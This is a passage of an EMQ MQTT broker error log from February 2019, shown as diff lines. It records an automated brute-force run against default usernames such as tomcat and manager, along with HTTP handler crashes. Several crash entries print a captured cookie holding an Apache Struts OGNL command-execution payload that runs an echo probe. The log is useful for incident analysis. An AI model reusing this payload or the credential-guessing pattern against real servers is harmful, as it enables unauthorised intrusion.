+18:37:15.734 [error] HTTP Auth failure: username=usr123, reason="User not found" 
+18:37:16.142 [error] HTTP Auth failure: username=webadmin, reason="User not found"
+18:37:16.663 [error] HTTP Auth failure: username=webtest, reason="User not found"
+18:37:17.304 [error] HTTP Auth failure: username=webtest, reason="User not found"
+18:37:18.040 [error] HTTP Auth failure: username=webuser, reason="User not found"
+18:37:18.077 [error] HTTP Auth failure: username=webtest, reason="User not found"
+18:37:18.401 [error] HTTP Auth failure: username=webtest, reason="User not found"
+18:37:18.678 [error] HTTP Auth failure: username=webuser, reason="User not found"
+18:37:19.443 [error] HTTP Auth failure: username=webtest, reason="User not found"
+18:37:19.892 [error] HTTP Auth failure: username=webuser, reason="User not found"
+18:37:20.146 [error] HTTP Auth failure: username=webuser, reason="User not found"
+18:37:20.639 [error] HTTP Auth failure: username=wwwuser, reason="User not found"
+18:37:20.739 [error] HTTP Auth failure: username=wwwuser, reason="User not found"
+18:37:21.200 [error] HTTP Auth failure: username=wwwuser, reason="User not found"
+18:37:22.248 [error] HTTP Auth failure: username=wwwuser, reason="User not found"
+18:37:22.370 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.7408.0> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.5827>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:37:22.371 [error] Error in process <0.7408.0> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.5827>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{11,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},nil}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:37:22.458 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.7409.0> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.5828>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:37:22.459 [error] Error in process <0.7409.0> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.5828>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{11,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},nil}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:37:22.542 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.7410.0> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.5829>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:37:22.544 [error] Error in process <0.7410.0> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.5829>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{11,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},nil}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:37:22.604 [error] HTTP Auth failure: username=webuser, reason="User not found"
+18:37:22.968 [error] HTTP Auth failure: username=role1, reason="User not found"
+18:37:23.333 [error] HTTP Auth failure: username=role1, reason="User not found"
+18:37:23.378 [error] HTTP Auth failure: username=role1, reason="User not found"
+18:37:23.468 [error] HTTP Auth failure: username=role1, reason="User not found"
+18:37:23.554 [error] HTTP Auth failure: username=both, reason="User not found"
+18:37:23.911 [error] HTTP Auth failure: username=both, reason="User not found"
+18:37:25.009 [error] HTTP Auth failure: username=wwwuser, reason="User not found"
+18:37:25.224 [error] HTTP Auth failure: username=both, reason="User not found"
+18:37:25.967 [error] HTTP Auth failure: username=role1, reason="User not found"
+18:37:26.272 [error] HTTP Auth failure: username=both, reason="User not found"
+18:37:26.333 [error] HTTP Auth failure: username=tomcat, reason="User not found" 
+18:37:26.620 [error] HTTP Auth failure: username=both, reason="User not found"
+18:37:26.633 [error] HTTP Auth failure: username=tomcat, reason="User not found" 
+18:37:26.691 [error] HTTP Auth failure: username=tomcat, reason="User not found" 
+18:37:27.009 [error] HTTP Auth failure: username=tomcat, reason="User not found" 
+18:37:27.098 [error] HTTP Auth failure: username=manager, reason="User not found"
+18:37:27.939 [error] HTTP Auth failure: username=manager, reason="User not found"
+18:37:28.325 [error] HTTP Auth failure: username=tomcat, reason="User not found" 
+18:37:28.451 [error] HTTP Auth failure: username=manager, reason="User not found"
+18:37:28.563 [error] HTTP Auth failure: username=manager, reason="User not found"
+18:37:29.487 [error] HTTP Auth failure: username=manager, reason="User not found"
+18:37:53.802 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.7479.0> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.5887>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:37:53.803 [error] Error in process <0.7479.0> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.5887>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20cb55e9d2a8902e4eadc053443c8b1f2f%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:37:54.164 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.7482.0> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.5889>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:37:54.166 [error] Error in process <0.7482.0> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.5889>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20cb55e9d2a8902e4eadc053443c8b1f2f%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:37:55.481 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.7483.0> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.5890>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:37:55.482 [error] Error in process <0.7483.0> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.5890>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20cb55e9d2a8902e4eadc053443c8b1f2f%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:38:07.067 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.7502.0> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.5906>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:38:07.068 [error] Error in process <0.7502.0> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.5906>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/xml"},{"content-length",{'Content-Length',"1702"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20cb55e9d2a8902e4eadc053443c8b1f2f%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:38:08.122 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.7505.0> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.5908>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:38:08.124 [error] Error in process <0.7505.0> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.5908>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/xml"},{"content-length",{'Content-Length',"1702"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20cb55e9d2a8902e4eadc053443c8b1f2f%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:38:08.206 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.7506.0> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.5909>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:38:08.208 [error] Error in process <0.7506.0> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.5909>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/xml"},{"content-length",{'Content-Length',"1702"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20cb55e9d2a8902e4eadc053443c8b1f2f%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:38:11.569 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.7509.0> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.5911>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:38:11.571 [error] Error in process <0.7509.0> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.5911>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20cb55e9d2a8902e4eadc053443c8b1f2f%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:38:11.930 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.7510.0> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.5912>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:38:11.932 [error] Error in process <0.7510.0> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.5912>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20cb55e9d2a8902e4eadc053443c8b1f2f%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:38:12.038 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.7511.0> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.5913>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:38:12.039 [error] Error in process <0.7511.0> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.5913>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20cb55e9d2a8902e4eadc053443c8b1f2f%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+
+===== ALIVE Fri Feb 15 18:53:12 CST 2019
+
+===== ALIVE Fri Feb 15 19:08:12 CST 2019
+
+===== ALIVE Fri Feb 15 19:23:12 CST 2019
+
+===== Fri Feb 15 19:34:46 CST 2019
+19:34:46.861 [error] gen_server <0.9799.0> terminated with reason: no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/EquipmentSituat...">>,...}]},...}, {proto_state,{{117,48,224,90},33482},#Fun<emqttd_client.0.18944683>,true,<<"equipment1">>,<0.9799.0>,...}) line 191
+19:34:46.862 [error] CRASH REPORT Process <0.9799.0> with 0 neighbours exited with reason: no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/EquipmentSituat...">>,...}]},...}, {proto_state,{{117,48,224,90},33482},#Fun<emqttd_client.0.18944683>,true,<<"equipment1">>,<0.9799.0>,...}) line 191 in gen_server2:terminate/3 line 1157
+19:34:46.862 [error] Supervisor 'esockd_connection_sup - <0.1431.0>' had child connection started with emqttd_client:start_link([{max_publish_rate,0},{client_idle_timeout,30000},{client_enable_stats,false},{max_clientid_len,...},...]) at <0.9799.0> exit with reason no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/EquipmentSituat...">>,...}]},...}, {proto_state,{{117,48,224,90},33482},#Fun<emqttd_client.0.18944683>,true,<<"equipment1">>,<0.9799.0>,...}) line 191 in context connection_crashed
+19:35:03.464 [error] gen_server <0.9915.0> terminated with reason: no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/ReturnOpen">>,...}]},...}, {proto_state,{{117,48,224,90},33690},#Fun<emqttd_client.0.18944683>,true,<<"ReturnOpen">>,<0.9915.0>,...}) line 191
+19:35:03.464 [error] CRASH REPORT Process <0.9915.0> with 0 neighbours exited with reason: no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/ReturnOpen">>,...}]},...}, {proto_state,{{117,48,224,90},33690},#Fun<emqttd_client.0.18944683>,true,<<"ReturnOpen">>,<0.9915.0>,...}) line 191 in gen_server2:terminate/3 line 1157
+19:35:03.465 [error] Supervisor 'esockd_connection_sup - <0.1431.0>' had child connection started with emqttd_client:start_link([{max_publish_rate,0},{client_idle_timeout,30000},{client_enable_stats,false},{max_clientid_len,...},...]) at <0.9915.0> exit with reason no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/ReturnOpen">>,...}]},...}, {proto_state,{{117,48,224,90},33690},#Fun<emqttd_client.0.18944683>,true,<<"ReturnOpen">>,<0.9915.0>,...}) line 191 in context connection_crashed
+19:35:19.631 [error] gen_server <0.10031.0> terminated with reason: no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/Consumption">>,...}]},...}, {proto_state,{{117,48,224,90},33892},#Fun<emqttd_client.0.18944683>,true,<<"6067">>,<0.10031.0>,...}) line 191
+19:35:19.631 [error] CRASH REPORT Process <0.10031.0> with 0 neighbours exited with reason: no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/Consumption">>,...}]},...}, {proto_state,{{117,48,224,90},33892},#Fun<emqttd_client.0.18944683>,true,<<"6067">>,<0.10031.0>,...}) line 191 in gen_server2:terminate/3 line 1157 
+19:35:19.631 [error] Supervisor 'esockd_connection_sup - <0.1431.0>' had child connection started with emqttd_client:start_link([{max_publish_rate,0},{client_idle_timeout,30000},{client_enable_stats,false},{max_clientid_len,...},...]) at <0.10031.0> exit with reason no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/Consumption">>,...}]},...}, {proto_state,{{117,48,224,90},33892},#Fun<emqttd_client.0.18944683>,true,<<"6067">>,<0.10031.0>,...}) line 191 in context connection_crashed
+
+===== ALIVE Fri Feb 15 19:50:19 CST 2019
+
+===== Fri Feb 15 19:55:55 CST 2019
+19:55:55.507 [error] HTTP Auth failure: username=, reason="User not found"
+
